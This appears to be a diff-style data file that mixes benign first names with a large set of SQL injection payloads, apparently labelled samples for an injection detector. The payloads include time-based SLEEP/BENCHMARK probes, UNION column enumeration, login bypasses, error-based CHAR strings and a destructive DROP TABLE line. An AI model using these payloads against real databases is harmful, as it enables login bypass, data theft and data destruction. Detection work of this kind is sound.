+"',(select * from (select(sleep(10)))a)'"
+''));
+'Hank'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'"
+'David'
+'Grace'
+"'ORDER BY 1,SLEEP(5)#'"
+'pg_SLEEP(5)#'
+'Charlie'
+'David'
+'John'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'"
+"'admin"""" or """"1""""=""""1'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'"
+"'ORDER BY 1,SLEEP(5)#'"
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2'"
+'Jill'
+'%' AND 8310=8310 AND '%'=''
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+'Bob'
+'Alice'
+'Fran'
+'Bob'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'ORDER BY 19--'
+'Bob'
+'Grace'
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'"
+'Bob'
+'Jill'
+'John'
+'OR 3409=3409 AND ('pytW' LIKE 'pytY'
+'John'
+'Fran'
+'Eve'
+'Hank'
+'Eve'
+'Fran'
+'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'"
+'HAVING 1=0'
+'Hank'
+'Hank'
+'Eve'
+'Alice'
+"'ORDER BY 1,SLEEP(5),3,4#'"
+'David'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'"
+'or SLEEP(5)=''
+'Grace'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--'"
+'Fran'
+'Hank'
+'Eve'
+'ORDER BY 30'
+'Alice'
+"'""""));"
+'Alice'
+'&&SLEEP(5)--'
+'Hank'
+'Charlie'
+'Charlie'
+'John'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#'"
+'Eve'
+'Bob'
+'Bob'
+"'""""-""""'"
+'AND 1=0--'
+';'
+'Jill'
+'Grace'
+'Fran'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+"'and (select substring(@@version,3,1))='c''"
+'ORDER BY 20--'
+Microservice running on port 7564
+'Charlie'
+"''\""""'"
+'David'
+"'and (select substring(@@version,1,1))='M''"
+'Grace'
+'Charlie'
+''=0--+'
+'John'
+'OR 3409=3409 AND ('pytW' LIKE 'pytY'
+'Bob'
+'Jill'
+'Bob'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'"
+'John'
+'admin' or '1'='1'/*'
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'"
+'Charlie'
+"'"""")) or ((""""x""""))=((""""x'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#'"
+'Grace'
+'Hank'
+'ORDER BY 15--'
+'Hank'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'Grace'
+'Alice'
+'pg_SLEEP(5)'
+'Jill'
+'John'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'"
+'Bob'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'"
+'OR x=x--'
+'Eve'
+'Alice'
+'Grace'
+'Charlie'
+'Grace'
+''; DROP TABLE users; --'
+''&''
+'David'
+'David'
+'Charlie'
+'David'
+'Bob'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))'"
+'David'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'"
+'Fran'
+'UNION ALL SELECT 1'
+'ORDER BY 31337#'
+'John'
+'Fran'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+'John'
+'admin' or '1'='1'#'
+'David'
+'Charlie'
+'Jill'
+'Fran'
+"'"""" or true--'"
+'Fran'
+"'1234 """" AND 1=0 UNION ALL SELECT """"admin"""", """"81dc9bdb52d04dc20036dbd8313ed055'"
+'Fran'
+'John'
+'Bob'
+'Jill'
+'Grace'
+'John'
+"'' AND MID(VERSION(),1,1) = '5';'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'"
+'Bob'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12'"
+'John'
+'Bob'
+'ORDER BY 31337#'
+'Bob'
+"'ORDER BY 1,SLEEP(5)#'"
+'Hank'
+'Alice'
+'Eve'
+'Grace'
+'John'
+'OR x=y'
+"'' or """"'"
+'Fran'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+"'') or benchmark(10000000,MD5(1))#'"
+'Fran'
+'UNION ALL SELECT SLEEP(5)--'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'ORDER BY 24--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'"
+'Bob'
+'Alice'
+'Hank'
+'Bob'
+'Grace'
+'Alice'
+'Alice'
+'John'
+'Hank'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'"
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'"
+'Jill'
+'David'
+"'"""" or sleep(5)#'"
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'John'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'Jill'
+'John'
+"'admin"""") or (""""1""""=""""1""""#'"
+"'' or """"'"
+'Grace'
+''''''''''''''UNION SELECT '2'
+'Eve'
+'Finding the table name'
+'Bob'
+'Bob'
+'Grace'
+'John'
+'David'
+'Grace'
+'admin' or 1=1#'
+'ORDER BY 8#'
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'David'
+'Eve'
+'AND 7300=7300 AND ('pKlZ'='pKlZ'
+'Hank'
+'Grace'
+'Alice'
+'John'
+'Alice'
+'David'
+'Bob'
+'Jill'
+'Alice'
+'ORDER BY 24'
+'%' AND 8310=8310 AND '%'=''
+'' or ''*''
+'Grace'
+"'-1 UNION SELECT 1 INTO @,@,@'"
+'ORDER BY 28#'
+'Jill'
+'Hank'
+'Bob'
+'Fran'
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--'
+'Bob'
+'Hank'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+'Alice'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+'Bob'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'') or sleep(5)=''
+'David'
+'ORDER BY 18'
+'Jill'
+'admin' or 1=1--'
+'ORDER BY 14#'
+'Grace'
+'1' ORDER BY 2--+'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'"
+'John'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--'"
+''=''
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'"
+'Fran'
+'Charlie'
+'Grace'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'AND 1=1--'
+'Grace'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'"
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'"
+'Eve'
+'Alice'
+'David'
+'Grace'
+'Eve'
+'Time-Based:'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+'Jill'
+'Alice'
+'Bob'
+"'""""""""'"
+'UNION ALL SELECT 'INJ'||'ECT'||'XXX'#'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'"
+"'"""" """"'"
+'Alice'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'"
+'Jill'
+'Bob'
+'HAVING 1=0#'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'"
+'John'
+'waitfor delay '00:00:05'#'
+"'UNION ALL SELECT 1,2#'"
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'
+'John'
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'"
+'Fran'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+''));
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--'"
+'AS INJECTX WHERE 1=1 AND 1=1'
+'Eve'
+'Charlie'
+'Charlie'
+'ORDER BY 31337#'
+'John'
+"'admin"""") or (""""1""""=""""1""""--'"
+'Bob'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'"
+'Alice'
+'David'
+'Bob'
+'Bob'
+'John'
+'Grace'
+'John'
+'ORDER BY 24#'
+'admin' or '1'='1'/*'
+'' OR EXISTS(SELECT * FROM users WHERE name = 'admin') --'
+"'UNION ALL SELECT 1,2,3#'"
+'John'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'"
+'Fran'
+'Alice'
+'1)) or sleep(5)#'
+'Bob'
+'Charlie'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'"
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'"
+'pg_SLEEP(5)#'
+'Bob'
+'AND 1=0#'
+'Fran'
+'Fran'
+"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'"
+'John'
+'David'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'"
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6--'"
+'Jill'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'Bob'
+'/*  	C-style comment'
+"'""""*""""'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'"
+'Hank'
+'1)) or sleep(5)#'
+'David'
+'Alice'
+'Jill'
+'Charlie'
+'Eve'
+'ORDER BY 1'
+'Charlie'
+'Fran'
+'Fran'
+'Eve'
+'John'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'"
+'Bob'
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'"
+'Bob'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'"
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'"
+'Hank'
+"'"""") or (""""x"""")=(""""x'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7'"
+'Fran'
+'Charlie'
+'Fran'
+'John'
+'Eve'
+'John'
+'Charlie'
+'Jill'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'"
+'Grace'
+"'""""));"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+'Bob'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10'"
+'Hank'
+'''
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'"
+'Hank'
+'1' ORDER BY 2--+'
+'Alice'
+'Charlie'
+'Hank'
+'Eve'
+'Eve'
+'David'
+'John'
+'ORDER BY 24--'
+';
+'Alice'
+'David'
+'Bob'
+'Jill'
+'Grace'
+'Fran'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'Charlie'
+"'"""" or pg_sleep(5)--'"
+'ORDER BY 23'
+'Bob'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'"
+'John'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'"
+"'UNION ALL SELECT 1,2'"
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+'# Numeric'
+'Eve'
+'John'
+'Eve'
+'Hank'
+"'"""" or """"""""&""""'"
+'Hank'
+'Eve'
+'UNION ALL SELECT 'INJ'||'ECT'||'XXX'--'
+'1 AND (SELECT * FROM Users) = 1'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'"
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'"
+'Bob'
+'Jill'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+'Hank'
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#'"
+'OR x=y#'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'"
+'Alice'
+'ORDER BY 14#'
+'Hank'
+'' GROUP BY columnnames having 1=1 --'
+'Eve'
+'John'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'ORDER BY 30'
+"'-1 UNION SELECT 1 INTO @,@,@'"
+'ORDER BY 4#'
+'John'
+'admin' or '1'='1'/*'
+'ORDER BY 6#'
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'
+'Jill'
+'David'
+'Alice'
+'Alice'
+'Fran'
+'Alice'
+'or SLEEP(5)#'
+'admin') or ('1'='1'#'
+'Charlie'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9'"
+'Grace'
+"'admin"""") or (""""1""""=""""1""""/*'"
+"'admin"""" or 1=1'"
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'"
+'Bob'
+'Bob'
+'David'
+'Hank'
+'ORDER BY SLEEP(5)--'
+'Eve'
+'Fran'
+'Alice'
+'Fran'
+'Alice'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'"
+'Bob'
+'Grace'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'"
+'Alice'
+'ORDER BY 11--'
+'Charlie'
+'Jill'
+'Hank'
+'David'
+'ORDER BY 18'
+'Charlie'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'"
+'John'
+'Alice'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+'Fran'
+'Alice'
+'Hank'
+"'admin"""") or (""""1""""=""""1""""#'"
+"'ORDER BY 1,SLEEP(5)#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'"
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'"
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+"'admin""""/*'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'"
+'Jill'
+'pg_sleep(5)--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'David'
+'Charlie'
+'Eve'
+'Alice'
+'Charlie'
+'%2c(select%20*%20from%20(select(sleep(10)))a)'
+'ORDER BY 28--'
+'Charlie'
+'Fran'
+'Jill'
+'sleep(5)#'
+'Charlie'
+'Jill'
+'Alice'
+'David'
+'-- -	SQL comment'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--'"
+';
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'"
+'ORDER BY 16--'
+'Bob'
+'Grace'
+'Eve'
+'Alice'
+'Hank'
+'Eve'
+'Alice'
+"'"""" or """""""" """"'"
+'John'
+'John'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+'Grace'
+'Charlie'
+'Eve'
+'Fran'
+'Charlie'
+'Eve'
+'Bob'
+'Charlie'
+''^''
+'ORDER BY 3--'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'"
+'ORDER BY 1#'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'"
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13'"
+'ORDER BY 11--'
+'ORDER BY 22--'
+'ORDER BY 2--'
+'ORDER BY 30--'
+'Jill'
+'Alice'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'"
+'Eve'
+'ORDER BY 12'
+'ORDER BY 23#'
+'Bob'
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'"
+'Hank'
+'Charlie'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'"
+'Jill'
+'Jill'
+'ORDER BY 9--'
+'ORDER BY 11'
